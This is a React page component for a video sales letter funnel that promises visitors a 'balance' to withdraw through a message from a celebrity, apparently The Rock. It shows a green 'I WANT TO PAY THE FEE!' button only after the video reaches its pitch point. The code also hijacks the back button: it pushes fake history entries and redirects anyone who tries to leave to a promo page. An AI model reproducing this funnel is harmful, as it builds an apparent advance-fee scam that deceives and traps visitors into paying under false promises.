import Button from "@/components/button";
import Comments from "@/components/comments";
import PlacesAlert from '@/components/places-alert';
import VSLBlackRock from "@/components/videos/vsl-black-rock";
import { useLayer } from '@/context/layer-provider';
import { trackEvent } from '@/libs/track-event';
import { useEffect, useState } from 'react';
import { CheckCheck, Loader2 } from 'lucide-react';

const VARIANT = 'rock';

export default function Page({
  active,
  handleClick,
}:{
  active: boolean,
  handleClick: () => void,
}) {

  const [visible, setVisible] = useState<boolean>(false);

  const userLayerData = useLayer();
  const userHost = userLayerData.host;
  const userFrontLink = `${userLayerData.frontLink}${userLayerData.frontLink.includes('?') ? '&' : '?'}xvar=${VARIANT}`;

  const VSL = VSLBlackRock;
  const videoId = "6900eee337870cfa28773b34";
  const backLink = `https://${userHost}/promo`;
  const pitchTime = 630;

  // Registra visualização da VSL
  useEffect(() => {
    trackEvent(VARIANT, 'vsl_view');
  }, []);

  // Detecta quando o botão aparece
  useEffect(() => {
    if (!visible) {
      const intervalId = setInterval(() => {
        const storedVideoTime = Number(localStorage.getItem(videoId + '-resume'));
        if (storedVideoTime > pitchTime) {
          setVisible(true);
          trackEvent(VARIANT, 'button_visible');
        };
      }, 1000);
      return () => clearInterval(intervalId);
    };
  }, [videoId, visible]);

  useEffect(() => {
    function setBackRedirect(url: string) {
      let urlBackRedirect = url;
      urlBackRedirect =
        urlBackRedirect.trim() +
        (urlBackRedirect.indexOf('?') > 0 ? '&' : '?') +
        document.location.search.replace('?', '').toString();
      history.pushState({}, '', location.href);
      history.pushState({}, '', location.href);
      history.pushState({}, '', location.href);
      window.addEventListener('popstate', () => {
        setTimeout(() => { location.href = urlBackRedirect; }, 1);
      });
    };
    setBackRedirect(backLink);
  }, [backLink]);

  return (
    <>
      <div className="flex flex-col text-center text-sm rounded-3xl gap-5 bg-gradient-to-t appear border-t px-4 py-6 from-gray-50 to-gray-200/50 border-gray-300">
        <span className="text-base sm:text-2xl font-semibold text-balance tracking-tight">
          See the message The Rock has for you to withdraw your balance! 👇
        </span>
        <PlacesAlert visible={visible} />
      </div>
      <div className="flex flex-col items-center gap-8 relative -mt-4">
        <VSL />
        {visible && (
          <a href={userFrontLink}>
            <Button
              onClick={() => { trackEvent(VARIANT, 'button_click'); handleClick(); }}
              disabled={active}
              className="pulse border-b-4 !px-6 !py-3 !bg-green-500 !border-green-600 hover:!bg-green-600"
            >
              {active ? (
                <Loader2 className="size-5 animate-spin" />
              ):(
                <CheckCheck className="size-5" />
              )}
              <span>I WANT TO PAY THE FEE!</span>
            </Button>
          </a>
        )}
      </div>
      {!visible && (
        <div className="text-sm text-center p-2">
          🔊 Check if your sound is turned on
        </div>
      )}
      <Comments />
    </>
  );

};
